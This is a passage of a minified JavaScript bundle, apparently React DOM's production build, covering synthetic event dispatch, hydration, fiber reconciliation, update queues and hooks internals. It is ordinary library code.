e;case"keydown":case"keyup":m=A0;break;case"focusin":f="focus",m=dl;break;case"focusout":f="blur",m=dl;break;case"beforeblur":case"afterblur":m=dl;break;case"click":if(n.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":m=Gh;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":m=f0;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":m=P0;break;case ly:case cy:case uy:m=y0;break;case dy:m=O0;break;case"scroll":m=h0;break;case"wheel":m=N0;break;case"copy":case"cut":case"paste":m=v0;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":m=Yh}var v=(t&4)!==0,x=!v&&e==="scroll",y=v?h!==null?h+"Capture":null:h;v=[];for(var g=c,b;g!==null;){b=g;var k=b.stateNode;if(b.tag===5&&k!==null&&(b=k,y!==null&&(k=Qr(g,y),k!=null&&v.push(ei(g,k,b)))),x)break;g=g.return}0<v.length&&(h=new m(h,f,null,n,u),d.push({event:h,listeners:v}))}}if(!(t&7)){e:{if(h=e==="mouseover"||e==="pointerover",m=e==="mouseout"||e==="pointerout",h&&n!==xc&&(f=n.relatedTarget||n.fromElement)&&(Bn(f)||f[Gt]))break e;if((m||h)&&(h=u.window===u?u:(h=u.ownerDocument)?h.defaultView||h.parentWindow:window,m?(f=n.relatedTarget||n.toElement,m=c,f=f?Bn(f):null,f!==null&&(x=os(f),f!==x||f.tag!==5&&f.tag!==6)&&(f=null)):(m=null,f=c),m!==f)){if(v=Gh,k="onMouseLeave",y="onMouseEnter",g="mouse",(e==="pointerout"||e==="pointerover")&&(v=Yh,k="onPointerLeave",y="onPointerEnter",g="pointer"),x=m==null?h:bs(m),b=f==null?h:bs(f),h=new v(k,g+"leave",m,n,u),h.target=x,h.relatedTarget=b,k=null,Bn(u)===c&&(v=new v(y,g+"enter",f,n,u),v.target=b,v.relatedTarget=x,k=v),x=k,m&&f)t:{for(v=m,y=f,g=0,b=v;b;b=us(b))g++;for(b=0,k=y;k;k=us(k))b++;for(;0<g-b;)v=us(v),g--;for(;0<b-g;)y=us(y),b--;for(;g--;){if(v===y||y!==null&&v===y.alternate)break t;v=us(v),y=us(y)}v=null}else v=null;m!==null&&ap(d,h,m,v,!1),f!==null&&x!==null&&ap(d,x,f,v,!0)}}e:{if(h=c?bs(c):window,m=h.nodeName&&h.nodeName.toLowerCase(),m==="select"||m==="input"&&h.type==="file")var C=B0;else if(Zh(h))if(sy)C=z0;else{C=W0;var E=V0}else(m=h.nodeName)&&m.toLowerCase()==="input"&&(h.type==="checkbox"||h.type==="radio")&&(C=U0);if(C&&(C=C(e,c))){ny(d,C,n,u);break e}E&&E(e,h,c),e==="focusout"&&(E=h._wrapperState)&&E.controlled&&h.type==="number"&&gc(h,"number",h.value)}switch(E=c?bs(c):window,e){case"focusin":(Zh(E)||E.contentEditable==="true")&&(ws=E,Rc=c,Nr=null);break;case"focusout":Nr=Rc=ws=null;break;case"mousedown":Pc=!0;break;case"contextmenu":case"mouseup":case"dragend":Pc=!1,rp(d,n,u);break;case"selectionchange":if(Q0)break;case"keydown":case"keyup":rp(d,n,u)}var S;if(id)e:{switch(e){case"compositionstart":var T="onCompositionStart";break e;case"compositionend":T="onCompositionEnd";break e;case"compositionupdate":T="onCompositionUpdate";break e}T=void 0}else ys?ey(e,n)&&(T="onCompositionEnd"):e==="keydown"&&n.keyCode===229&&(T="onCompositionStart");T&&(Zg&&n.locale!=="ko"&&(ys||T!=="onCompositionStart"?T==="onCompositionEnd"&&ys&&(S=Jg()):(cn=u,nd="value"in cn?cn.value:cn.textContent,ys=!0)),E=Ho(c,T),0<E.length&&(T=new Kh(T,e,null,n,u),d.push({event:T,listeners:E}),S?T.data=S:(S=ty(n),S!==null&&(T.data=S)))),(S=M0?L0(e,n):D0(e,n))&&(c=Ho(c,"onBeforeInput"),0<c.length&&(u=new Kh("onBeforeInput","beforeinput",null,n,u),d.push({event:u,listeners:c}),u.data=S))}py(d,t)})}function ei(e,t,n){return{instance:e,listener:t,currentTarget:n}}function Ho(e,t){for(var n=t+"Capture",s=[];e!==null;){var r=e,i=r.stateNode;r.tag===5&&i!==null&&(r=i,i=Qr(e,n),i!=null&&s.unshift(ei(e,i,r)),i=Qr(e,t),i!=null&&s.push(ei(e,i,r))),e=e.return}return s}function us(e){if(e===null)return null;do e=e.return;while(e&&e.tag!==5);return e||null}function ap(e,t,n,s,r){for(var i=t._reactName,o=[];n!==null&&n!==s;){var a=n,l=a.alternate,c=a.stateNode;if(l!==null&&l===s)break;a.tag===5&&c!==null&&(a=c,r?(l=Qr(n,i),l!=null&&o.unshift(ei(n,l,a))):r||(l=Qr(n,i),l!=null&&o.push(ei(n,l,a)))),n=n.return}o.length!==0&&e.push({event:t,listeners:o})}var X0=/\r\n?/g,J0=/\u0000|\uFFFD/g;function lp(e){return(typeof e=="string"?e:""+e).replace(X0,`
`).replace(J0,"")}function Ki(e,t,n){if(t=lp(t),lp(e)!==t&&n)throw Error(P(425))}function Qo(){}var qc=null,Oc=null;function Ic(e,t){return e==="textarea"||e==="noscript"||typeof t.children=="string"||typeof t.children=="number"||typeof t.dangerouslySetInnerHTML=="object"&&t.dangerouslySetInnerHTML!==null&&t.dangerouslySetInnerHTML.__html!=null}var Nc=typeof setTimeout=="function"?setTimeout:void 0,Z0=typeof clearTimeout=="function"?clearTimeout:void 0,cp=typeof Promise=="function"?Promise:void 0,ek=typeof queueMicrotask=="function"?queueMicrotask:typeof cp<"u"?function(e){return cp.resolve(null).then(e).catch(tk)}:Nc;function tk(e){setTimeout(function(){throw e})}function vl(e,t){var n=t,s=0;do{var r=n.nextSibling;if(e.removeChild(n),r&&r.nodeType===8)if(n=r.data,n==="/$"){if(s===0){e.removeChild(r),Yr(t);return}s--}else n!=="$"&&n!=="$?"&&n!=="$!"||s++;n=r}while(n);Yr(t)}function gn(e){for(;e!=null;e=e.nextSibling){var t=e.nodeType;if(t===1||t===3)break;if(t===8){if(t=e.data,t==="$"||t==="$!"||t==="$?")break;if(t==="/$")return null}}return e}function up(e){e=e.previousSibling;for(var t=0;e;){if(e.nodeType===8){var n=e.data;if(n==="$"||n==="$!"||n==="$?"){if(t===0)return e;t--}else n==="/$"&&t++}e=e.previousSibling}return null}var nr=Math.random().toString(36).slice(2),qt="__reactFiber$"+nr,ti="__reactProps$"+nr,Gt="__reactContainer$"+nr,jc="__reactEvents$"+nr,nk="__reactListeners$"+nr,sk="__reactHandles$"+nr;function Bn(e){var t=e[qt];if(t)return t;for(var n=e.parentNode;n;){if(t=n[Gt]||n[qt]){if(n=t.alternate,t.child!==null||n!==null&&n.child!==null)for(e=up(e);e!==null;){if(n=e[qt])return n;e=up(e)}return t}e=n,n=e.parentNode}return null}function Ti(e){return e=e[qt]||e[Gt],!e||e.tag!==5&&e.tag!==6&&e.tag!==13&&e.tag!==3?null:e}function bs(e){if(e.tag===5||e.tag===6)return e.stateNode;throw Error(P(33))}function Na(e){return e[ti]||null}var Mc=[],xs=-1;function En(e){return{current:e}}function J(e){0>xs||(e.current=Mc[xs],Mc[xs]=null,xs--)}function K(e,t){xs++,Mc[xs]=e.current,e.current=t}var Tn={},Ae=En(Tn),Fe=En(!1),Zn=Tn;function zs(e,t){var n=e.type.contextTypes;if(!n)return Tn;var s=e.stateNode;if(s&&s.__reactInternalMemoizedUnmaskedChildContext===t)return s.__reactInternalMemoizedMaskedChildContext;var r={},i;for(i in n)r[i]=t[i];return s&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=t,e.__reactInternalMemoizedMaskedChildContext=r),r}function Be(e){return e=e.childContextTypes,e!=null}function Go(){J(Fe),J(Ae)}function dp(e,t,n){if(Ae.current!==Tn)throw Error(P(168));K(Ae,t),K(Fe,n)}function my(e,t,n){var s=e.stateNode;if(t=t.childContextTypes,typeof s.getChildContext!="function")return n;s=s.getChildContext();for(var r in s)if(!(r in t))throw Error(P(108,Vx(e)||"Unknown",r));return ne({},n,s)}function Ko(e){return e=(e=e.stateNode)&&e.__reactInternalMemoizedMergedChildContext||Tn,Zn=Ae.current,K(Ae,e),K(Fe,Fe.current),!0}function hp(e,t,n){var s=e.stateNode;if(!s)throw Error(P(169));n?(e=my(e,t,Zn),s.__reactInternalMemoizedMergedChildContext=e,J(Fe),J(Ae),K(Ae,e)):J(Fe),K(Fe,n)}var Wt=null,ja=!1,bl=!1;function gy(e){Wt===null?Wt=[e]:Wt.push(e)}function rk(e){ja=!0,gy(e)}function Rn(){if(!bl&&Wt!==null){bl=!0;var e=0,t=z;try{var n=Wt;for(z=1;e<n.length;e++){var s=n[e];do s=s(!0);while(s!==null)}Wt=null,ja=!1}catch(r){throw Wt!==null&&(Wt=Wt.slice(e+1)),Vg(Ju,Rn),r}finally{z=t,bl=!1}}return null}var ks=[],Ss=0,Yo=null,Xo=0,st=[],rt=0,es=null,zt=1,$t="";function Ln(e,t){ks[Ss++]=Xo,ks[Ss++]=Yo,Yo=e,Xo=t}function yy(e,t,n){st[rt++]=zt,st[rt++]=$t,st[rt++]=es,es=e;var s=zt;e=$t;var r=32-bt(s)-1;s&=~(1<<r),n+=1;var i=32-bt(t)+r;if(30<i){var o=r-r%5;i=(s&(1<<o)-1).toString(32),s>>=o,r-=o,zt=1<<32-bt(t)+r|n<<r|s,$t=i+e}else zt=1<<i|n<<r|s,$t=e}function ad(e){e.return!==null&&(Ln(e,1),yy(e,1,0))}function ld(e){for(;e===Yo;)Yo=ks[--Ss],ks[Ss]=null,Xo=ks[--Ss],ks[Ss]=null;for(;e===es;)es=st[--rt],st[rt]=null,$t=st[--rt],st[rt]=null,zt=st[--rt],st[rt]=null}var Ke=null,Qe=null,Z=!1,gt=null;function wy(e,t){var n=it(5,null,null,0);n.elementType="DELETED",n.stateNode=t,n.return=e,t=e.deletions,t===null?(e.deletions=[n],e.flags|=16):t.push(n)}function pp(e,t){switch(e.tag){case 5:var n=e.type;return t=t.nodeType!==1||n.toLowerCase()!==t.nodeName.toLowerCase()?null:t,t!==null?(e.stateNode=t,Ke=e,Qe=gn(t.firstChild),!0):!1;case 6:return t=e.pendingProps===""||t.nodeType!==3?null:t,t!==null?(e.stateNode=t,Ke=e,Qe=null,!0):!1;case 13:return t=t.nodeType!==8?null:t,t!==null?(n=es!==null?{id:zt,overflow:$t}:null,e.memoizedState={dehydrated:t,treeContext:n,retryLane:1073741824},n=it(18,null,null,0),n.stateNode=t,n.return=e,e.child=n,Ke=e,Qe=null,!0):!1;default:return!1}}function Lc(e){return(e.mode&1)!==0&&(e.flags&128)===0}function Dc(e){if(Z){var t=Qe;if(t){var n=t;if(!pp(e,t)){if(Lc(e))throw Error(P(418));t=gn(n.nextSibling);var s=Ke;t&&pp(e,t)?wy(s,n):(e.flags=e.flags&-4097|2,Z=!1,Ke=e)}}else{if(Lc(e))throw Error(P(418));e.flags=e.flags&-4097|2,Z=!1,Ke=e}}}function fp(e){for(e=e.return;e!==null&&e.tag!==5&&e.tag!==3&&e.tag!==13;)e=e.return;Ke=e}function Yi(e){if(e!==Ke)return!1;if(!Z)return fp(e),Z=!0,!1;var t;if((t=e.tag!==3)&&!(t=e.tag!==5)&&(t=e.type,t=t!=="head"&&t!=="body"&&!Ic(e.type,e.memoizedProps)),t&&(t=Qe)){if(Lc(e))throw vy(),Error(P(418));for(;t;)wy(e,t),t=gn(t.nextSibling)}if(fp(e),e.tag===13){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(P(317));e:{for(e=e.nextSibling,t=0;e;){if(e.nodeType===8){var n=e.data;if(n==="/$"){if(t===0){Qe=gn(e.nextSibling);break e}t--}else n!=="$"&&n!=="$!"&&n!=="$?"||t++}e=e.nextSibling}Qe=null}}else Qe=Ke?gn(e.stateNode.nextSibling):null;return!0}function vy(){for(var e=Qe;e;)e=gn(e.nextSibling)}function $s(){Qe=Ke=null,Z=!1}function cd(e){gt===null?gt=[e]:gt.push(e)}var ik=Jt.ReactCurrentBatchConfig;function fr(e,t,n){if(e=n.ref,e!==null&&typeof e!="function"&&typeof e!="object"){if(n._owner){if(n=n._owner,n){if(n.tag!==1)throw Error(P(309));var s=n.stateNode}if(!s)throw Error(P(147,e));var r=s,i=""+e;return t!==null&&t.ref!==null&&typeof t.ref=="function"&&t.ref._stringRef===i?t.ref:(t=function(o){var a=r.refs;o===null?delete a[i]:a[i]=o},t._stringRef=i,t)}if(typeof e!="string")throw Error(P(284));if(!n._owner)throw Error(P(290,e))}return e}function Xi(e,t){throw e=Object.prototype.toString.call(t),Error(P(31,e==="[object Object]"?"object with keys {"+Object.keys(t).join(", ")+"}":e))}function mp(e){var t=e._init;return t(e._payload)}function by(e){function t(y,g){if(e){var b=y.deletions;b===null?(y.deletions=[g],y.flags|=16):b.push(g)}}function n(y,g){if(!e)return null;for(;g!==null;)t(y,g),g=g.sibling;return null}function s(y,g){for(y=new Map;g!==null;)g.key!==null?y.set(g.key,g):y.set(g.index,g),g=g.sibling;return y}function r(y,g){return y=bn(y,g),y.index=0,y.sibling=null,y}function i(y,g,b){return y.index=b,e?(b=y.alternate,b!==null?(b=b.index,b<g?(y.flags|=2,g):b):(y.flags|=2,g)):(y.flags|=1048576,g)}function o(y){return e&&y.alternate===null&&(y.flags|=2),y}function a(y,g,b,k){return g===null||g.tag!==6?(g=El(b,y.mode,k),g.return=y,g):(g=r(g,b),g.return=y,g)}function l(y,g,b,k){var C=b.type;return C===gs?u(y,g,b.props.children,k,b.key):g!==null&&(g.elementType===C||typeof C=="object"&&C!==null&&C.$$typeof===rn&&mp(C)===g.type)?(k=r(g,b.props),k.ref=fr(y,g,b),k.return=y,k):(k=qo(b.type,b.key,b.props,null,y.mode,k),k.ref=fr(y,g,b),k.return=y,k)}function c(y,g,b,k){return g===null||g.tag!==4||g.stateNode.containerInfo!==b.containerInfo||g.stateNode.implementation!==b.implementation?(g=Rl(b,y.mode,k),g.return=y,g):(g=r(g,b.children||[]),g.return=y,g)}function u(y,g,b,k,C){return g===null||g.tag!==7?(g=Qn(b,y.mode,k,C),g.return=y,g):(g=r(g,b),g.return=y,g)}function d(y,g,b){if(typeof g=="string"&&g!==""||typeof g=="number")return g=El(""+g,y.mode,b),g.return=y,g;if(typeof g=="object"&&g!==null){switch(g.$$typeof){case Bi:return b=qo(g.type,g.key,g.props,null,y.mode,b),b.ref=fr(y,null,g),b.return=y,b;case ms:return g=Rl(g,y.mode,b),g.return=y,g;case rn:var k=g._init;return d(y,k(g._payload),b)}if(br(g)||cr(g))return g=Qn(g,y.mode,b,null),g.return=y,g;Xi(y,g)}return null}function h(y,g,b,k){var C=g!==null?g.key:null;if(typeof b=="string"&&b!==""||typeof b=="number")return C!==null?null:a(y,g,""+b,k);if(typeof b=="object"&&b!==null){switch(b.$$typeof){case Bi:return b.key===C?l(y,g,b,k):null;case ms:return b.key===C?c(y,g,b,k):null;case rn:return C=b._init,h(y,g,C(b._payload),k)}if(br(b)||cr(b))return C!==null?null:u(y,g,b,k,null);Xi(y,b)}return null}function m(y,g,b,k,C){if(typeof k=="string"&&k!==""||typeof k=="number")return y=y.get(b)||null,a(g,y,""+k,C);if(typeof k=="object"&&k!==null){switch(k.$$typeof){case Bi:return y=y.get(k.key===null?b:k.key)||null,l(g,y,k,C);case ms:return y=y.get(k.key===null?b:k.key)||null,c(g,y,k,C);case rn:var E=k._init;return m(y,g,b,E(k._payload),C)}if(br(k)||cr(k))return y=y.get(b)||null,u(g,y,k,C,null);Xi(g,k)}return null}function f(y,g,b,k){for(var C=null,E=null,S=g,T=g=0,q=null;S!==null&&T<b.length;T++){S.index>T?(q=S,S=null):q=S.sibling;var R=h(y,S,b[T],k);if(R===null){S===null&&(S=q);break}e&&S&&R.alternate===null&&t(y,S),g=i(R,g,T),E===null?C=R:E.sibling=R,E=R,S=q}if(T===b.length)return n(y,S),Z&&Ln(y,T),C;if(S===null){for(;T<b.length;T++)S=d(y,b[T],k),S!==null&&(g=i(S,g,T),E===null?C=S:E.sibling=S,E=S);return Z&&Ln(y,T),C}for(S=s(y,S);T<b.length;T++)q=m(S,y,T,b[T],k),q!==null&&(e&&q.alternate!==null&&S.delete(q.key===null?T:q.key),g=i(q,g,T),E===null?C=q:E.sibling=q,E=q);return e&&S.forEach(function(M){return t(y,M)}),Z&&Ln(y,T),C}function v(y,g,b,k){var C=cr(b);if(typeof C!="function")throw Error(P(150));if(b=C.call(b),b==null)throw Error(P(151));for(var E=C=null,S=g,T=g=0,q=null,R=b.next();S!==null&&!R.done;T++,R=b.next()){S.index>T?(q=S,S=null):q=S.sibling;var M=h(y,S,R.value,k);if(M===null){S===null&&(S=q);break}e&&S&&M.alternate===null&&t(y,S),g=i(M,g,T),E===null?C=M:E.sibling=M,E=M,S=q}if(R.done)return n(y,S),Z&&Ln(y,T),C;if(S===null){for(;!R.done;T++,R=b.next())R=d(y,R.value,k),R!==null&&(g=i(R,g,T),E===null?C=R:E.sibling=R,E=R);return Z&&Ln(y,T),C}for(S=s(y,S);!R.done;T++,R=b.next())R=m(S,y,T,R.value,k),R!==null&&(e&&R.alternate!==null&&S.delete(R.key===null?T:R.key),g=i(R,g,T),E===null?C=R:E.sibling=R,E=R);return e&&S.forEach(function(Q){return t(y,Q)}),Z&&Ln(y,T),C}function x(y,g,b,k){if(typeof b=="object"&&b!==null&&b.type===gs&&b.key===null&&(b=b.props.children),typeof b=="object"&&b!==null){switch(b.$$typeof){case Bi:e:{for(var C=b.key,E=g;E!==null;){if(E.key===C){if(C=b.type,C===gs){if(E.tag===7){n(y,E.sibling),g=r(E,b.props.children),g.return=y,y=g;break e}}else if(E.elementType===C||typeof C=="object"&&C!==null&&C.$$typeof===rn&&mp(C)===E.type){n(y,E.sibling),g=r(E,b.props),g.ref=fr(y,E,b),g.return=y,y=g;break e}n(y,E);break}else t(y,E);E=E.sibling}b.type===gs?(g=Qn(b.props.children,y.mode,k,b.key),g.return=y,y=g):(k=qo(b.type,b.key,b.props,null,y.mode,k),k.ref=fr(y,g,b),k.return=y,y=k)}return o(y);case ms:e:{for(E=b.key;g!==null;){if(g.key===E)if(g.tag===4&&g.stateNode.containerInfo===b.containerInfo&&g.stateNode.implementation===b.implementation){n(y,g.sibling),g=r(g,b.children||[]),g.return=y,y=g;break e}else{n(y,g);break}else t(y,g);g=g.sibling}g=Rl(b,y.mode,k),g.return=y,y=g}return o(y);case rn:return E=b._init,x(y,g,E(b._payload),k)}if(br(b))return f(y,g,b,k);if(cr(b))return v(y,g,b,k);Xi(y,b)}return typeof b=="string"&&b!==""||typeof b=="number"?(b=""+b,g!==null&&g.tag===6?(n(y,g.sibling),g=r(g,b),g.return=y,y=g):(n(y,g),g=El(b,y.mode,k),g.return=y,y=g),o(y)):n(y,g)}return x}var Hs=by(!0),xy=by(!1),Jo=En(null),Zo=null,Ts=null,ud=null;function dd(){ud=Ts=Zo=null}function hd(e){var t=Jo.current;J(Jo),e._currentValue=t}function _c(e,t,n){for(;e!==null;){var s=e.alternate;if((e.childLanes&t)!==t?(e.childLanes|=t,s!==null&&(s.childLanes|=t)):s!==null&&(s.childLanes&t)!==t&&(s.childLanes|=t),e===n)break;e=e.return}}function Ds(e,t){Zo=e,ud=Ts=null,e=e.dependencies,e!==null&&e.firstContext!==null&&(e.lanes&t&&(De=!0),e.firstContext=null)}function lt(e){var t=e._currentValue;if(ud!==e)if(e={context:e,memoizedValue:t,next:null},Ts===null){if(Zo===null)throw Error(P(308));Ts=e,Zo.dependencies={lanes:0,firstContext:e}}else Ts=Ts.next=e;return t}var Vn=null;function pd(e){Vn===null?Vn=[e]:Vn.push(e)}function ky(e,t,n,s){var r=t.interleaved;return r===null?(n.next=n,pd(t)):(n.next=r.next,r.next=n),t.interleaved=n,Kt(e,s)}function Kt(e,t){e.lanes|=t;var n=e.alternate;for(n!==null&&(n.lanes|=t),n=e,e=e.return;e!==null;)e.childLanes|=t,n=e.alternate,n!==null&&(n.childLanes|=t),n=e,e=e.return;return n.tag===3?n.stateNode:null}var on=!1;function fd(e){e.updateQueue={baseState:e.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function Sy(e,t){e=e.updateQueue,t.updateQueue===e&&(t.updateQueue={baseState:e.baseState,firstBaseUpdate:e.firstBaseUpdate,lastBaseUpdate:e.lastBaseUpdate,shared:e.shared,effects:e.effects})}function Ht(e,t){return{eventTime:e,lane:t,tag:0,payload:null,callback:null,next:null}}function yn(e,t,n){var s=e.updateQueue;if(s===null)return null;if(s=s.shared,W&2){var r=s.pending;return r===null?t.next=t:(t.next=r.next,r.next=t),s.pending=t,Kt(e,n)}return r=s.interleaved,r===null?(t.next=t,pd(s)):(t.next=r.next,r.next=t),s.interleaved=t,Kt(e,n)}function To(e,t,n){if(t=t.updateQueue,t!==null&&(t=t.shared,(n&4194240)!==0)){var s=t.lanes;s&=e.pendingLanes,n|=s,t.lanes=n,Zu(e,n)}}function gp(e,t){var n=e.updateQueue,s=e.alternate;if(s!==null&&(s=s.updateQueue,n===s)){var r=null,i=null;if(n=n.firstBaseUpdate,n!==null){do{var o={eventTime:n.eventTime,lane:n.lane,tag:n.tag,payload:n.payload,callback:n.callback,next:null};i===null?r=i=o:i=i.next=o,n=n.next}while(n!==null);i===null?r=i=t:i=i.next=t}else r=i=t;n={baseState:s.baseState,firstBaseUpdate:r,lastBaseUpdate:i,shared:s.shared,effects:s.effects},e.updateQueue=n;return}e=n.lastBaseUpdate,e===null?n.firstBaseUpdate=t:e.next=t,n.lastBaseUpdate=t}function ea(e,t,n,s){var r=e.updateQueue;on=!1;var i=r.firstBaseUpdate,o=r.lastBaseUpdate,a=r.shared.pending;if(a!==null){r.shared.pending=null;var l=a,c=l.next;l.next=null,o===null?i=c:o.next=c,o=l;var u=e.alternate;u!==null&&(u=u.updateQueue,a=u.lastBaseUpdate,a!==o&&(a===null?u.firstBaseUpdate=c:a.next=c,u.lastBaseUpdate=l))}if(i!==null){var d=r.baseState;o=0,u=c=l=null,a=i;do{var h=a.lane,m=a.eventTime;if((s&h)===h){u!==null&&(u=u.next={eventTime:m,lane:0,tag:a.tag,payload:a.payload,callback:a.callback,next:null});e:{var f=e,v=a;switch(h=t,m=n,v.tag){case 1:if(f=v.payload,typeof f=="function"){d=f.call(m,d,h);break e}d=f;break e;case 3:f.flags=f.flags&-65537|128;case 0:if(f=v.payload,h=typeof f=="function"?f.call(m,d,h):f,h==null)break e;d=ne({},d,h);break e;case 2:on=!0}}a.callback!==null&&a.lane!==0&&(e.flags|=64,h=r.effects,h===null?r.effects=[a]:h.push(a))}else m={eventTime:m,lane:h,tag:a.tag,payload:a.payload,callback:a.callback,next:null},u===null?(c=u=m,l=d):u=u.next=m,o|=h;if(a=a.next,a===null){if(a=r.shared.pending,a===null)break;h=a,a=h.next,h.next=null,r.lastBaseUpdate=h,r.shared.pending=null}}while(!0);if(u===null&&(l=d),r.baseState=l,r.firstBaseUpdate=c,r.lastBaseUpdate=u,t=r.shared.interleaved,t!==null){r=t;do o|=r.lane,r=r.next;while(r!==t)}else i===null&&(r.shared.lanes=0);ns|=o,e.lanes=o,e.memoizedState=d}}function yp(e,t,n){if(e=t.effects,t.effects=null,e!==null)for(t=0;t<e.length;t++){var s=e[t],r=s.callback;if(r!==null){if(s.callback=null,s=n,typeof r!="function")throw Error(P(191,r));r.call(s)}}}var Ci={},jt=En(Ci),ni=En(Ci),si=En(Ci);function Wn(e){if(e===Ci)throw Error(P(174));return e}function md(e,t){switch(K(si,t),K(ni,e),K(jt,Ci),e=t.nodeType,e){case 9:case 11:t=(t=t.documentElement)?t.namespaceURI:wc(null,"");break;default:e=e===8?t.parentNode:t,t=e.namespaceURI||null,e=e.tagName,t=wc(t,e)}J(jt),K(jt,t)}function Qs(){J(jt),J(ni),J(si)}function Ty(e){Wn(si.current);var t=Wn(jt.current),n=wc(t,e.type);t!==n&&(K(ni,e),K(jt,n))}function gd(e){ni.current===e&&(J(jt),J(ni))}var ee=En(0);function ta(e){for(var t=e;t!==null;){if(t.tag===13){var n=t.memoizedState;if(n!==null&&(n=n.dehydrated,n===null||n.data==="$?"||n.data==="$!"))return t}else if(t.tag===19&&t.memoizedProps.revealOrder!==void 0){if(t.flags&128)return t}else if(t.child!==null){t.child.return=t,t=t.child;continue}if(t===e)break;for(;t.sibling===null;){if(t.return===null||t.return===e)return null;t=t.return}t.sibling.return=t.return,t=t.sibling}return null}var xl=[];function yd(){for(var e=0;e<xl.length;e++)xl[e]._workInProgressVersionPrimary=null;xl.length=0}var Co=Jt.ReactCurrentDispatcher,kl=Jt.ReactCurrentBatchConfig,ts=0,te=null,pe=null,ge=null,na=!1,jr=!1,ri=0,ok=0;function Se(){throw Error(P(321))}function wd(e,t){if(t===null)return!1;for(var n=0;n<t.length&&n<e.length;n++)if(!kt(e[n],t[n]))return!1;return!0}function vd(e,t,n,s,r,i){if(ts=i,te=t,t.memoizedState=null,t.updateQueue=null,t.lanes=0,Co.current=e===null||e.memoizedState===null?uk:dk,e=n(s,r),jr){i=0;do{if(jr=!1,ri=0,25<=i)throw Error(P(301));i+=1,ge=pe=null,t.updateQueue=null,Co.current=hk,e=n(s,r)}while(jr)}if(Co.current=sa,t=pe!==null&&pe.next!==null,ts=0,ge=pe=te=null,na=!1,t)throw Error(P(300));return e}function bd(){var e=ri!==0;return ri=0,e}function At(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return ge===null?te.memoizedState=ge=e:ge=ge.next=e,ge}function ct(){if(pe===null){var e=te.alternate;e=e!==null?e.memoizedState:null}else e=pe.next;var t=ge===null?te.memoizedState:ge.next;if(t!==null)ge=t,pe=e;else{if(e===null)throw Error(P(310));pe=e,e={memoizedState:pe.memoizedState,baseState:pe.baseState,baseQueue:pe.baseQueue,queue:pe.queue,next:null},ge===null?te.memoizedState=ge=e:ge=ge.next=e}return ge}function ii(e,t){return typeof t=="function"?t(e):t}function Sl(e){var t=ct(),n=t.queue;if(n===null)throw Error(P(311));n.lastRenderedReducer=e;var s=pe,r=s.baseQueue,i=n.pending;if(i!==null){if(r!==null){var o=r.next;r.next=i.next,i.next=o}s.baseQueue=r=i,n.pending=null}if(r!==null){i=r.next,s=s.baseState;var a=o=null,l=null,c=i;do{var u=c.lane;if((ts&u)===u)l!==null&&(l=l.next={lane:0,action:c.action,hasEagerState:c.hasEagerState,eagerState:c.eagerState,next:null}),s=c.hasEagerState?c.eagerState:e(s,c.action);else{var d={lane:u,action:c.action,hasEagerState:c.hasEagerState,eagerState:c.eagerState,next:null};l===null?(a=l=d,o=s):l=l.next=d,te.lanes|=u,ns|=u}c=c.next}while(c!==null&&c!==i);l===null?o=s:l.next=a,kt(s,t.memoizedState)||(De=!0),t.memoizedState=s,t.baseState=o,t.baseQueue=l,n.lastRenderedState=s}if(e=n.interleaved,e!==null){r=e;do i=r.lane,te.lanes|=i,ns|=i,r=r.next;while(r!==e)}else r===null&&(n.lanes=0);return[t.memoizedState,n.dispatch]}function Tl(e){var t=ct(),n=t.queue;if(n===null)throw Error(P(311));n.lastRenderedReducer=e;var s=n.dispatch,r=n.pending,i=t.memoizedState;if(r!==null){n.pending=null;var o=r=r.next;do i=e(i,o.action),o=o.next;while(o!==r);kt(i,t.memoizedState)||(De=!0),t.memoizedState=i,t.baseQueue===null&&(t.baseState=i),n.lastRenderedState=i}return[i,s]}function Cy(){}function Ay(e,t){var n=te,s=ct(),r=t(),i=!kt(s.memoizedState,r);if(i&&(s.memoizedState=r,De=!0),s=s.queue,xd(Py.bind(null,n,s,e),[e]),s.getSnapshot!==t||i||ge!==null&&ge.memoizedState.tag&1){if(n.flags|=2048,oi(9,Ry.bind(null,n,s,r,t),void 0,null),we===null)throw Error(P(349));ts&30||Ey(n,t,r)}return r}function Ey(e,t,n){e.flags|=16384,e={getSnapshot:t,value:n},t=te.updateQueue,t===null?(t={lastEffect:null,stores:null},te.updateQueue=t,t.stores=[e]):(n=t.stores,n===null?t.stores=[e]:n.push(e))}function Ry(e,t,n,s){t.value=n,t.getSnapshot=s,qy(t)&&Oy(e)}function Py(e,t,n){return n(function(){qy(t)&&Oy(e)})}function qy(e){var t=e.getSnapshot;e=e.value;try{var n=t();return!kt(e,n)}catch{return!0}}function Oy(e){var t=Kt(e,1);t!==null&&xt(t,e,1,-1)}function wp(e){var t=At();return typeof e=="function"&&(e=e()),t.memoizedState=t.baseState=e,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:ii,lastRenderedState:e},t.queue=e,e=e.dispatch=ck.bind(null,te,e),[t.memoizedState,e]}function oi(e,t,n,s){return e={tag:e,create:t,destroy:n,deps:s,next:null},t=te.updateQueue,t===null?(t={lastEffect:null,stores:null},te.updateQueue=t,t.lastEffect=e.next=e):(n=t.lastEffect,n===null?t.lastEffect=e.next=e:(s=n.next,n.next=e,e.next=s,t.lastEffect=e)),e}function Iy(){return ct().memoizedState}function Ao(e,t,n,s){var r=At();te.flags|=e,r.memoizedState=oi(1|t,n,void 0,s===void 0?null:s)}function Ma(e,t,n,s){var r=ct();s=s===void 0?null:s;var i=void 0;if(pe!==null){var o=pe.memoizedState;if(i=o.destroy,s!==null&&wd(s,o.deps)){r.memoizedState=oi(t,n,i,s);return}}te.flags|=e,r.memoizedState=oi(1|t,n,i,s)}function vp(e,t){return Ao(8390656,8,e,t)}function xd(e,t){return Ma(2048,8,e,t)}function Ny(e,t){return Ma(4,2,e,t)}function jy(e,t){return Ma(4,4,e,t)}function My(e,t){if(typeof t=="function")return 